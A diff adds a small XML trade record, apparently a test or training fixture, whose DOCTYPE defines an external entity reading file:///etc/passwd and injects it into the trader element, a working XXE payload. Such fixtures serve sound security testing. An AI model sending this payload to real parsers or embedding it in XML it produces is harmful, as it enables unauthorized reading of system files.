@@ -1,0 +1,16 @@
+<?xml version="1.0" encoding="UTF-8"?>
+
+<!DOCTYPE foo [<!ELEMENT foo ANY >
+        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+
+<trades>
+    <metadata>
+        <name>Green Smoothie</name>
+        <trader>
+            <foo>&xxe;</foo>
+            <name>S. Ray</name>
+        </trader>
+        <units>2300</units>
+        <price>400</price>
+    </metadata>
+</trades>
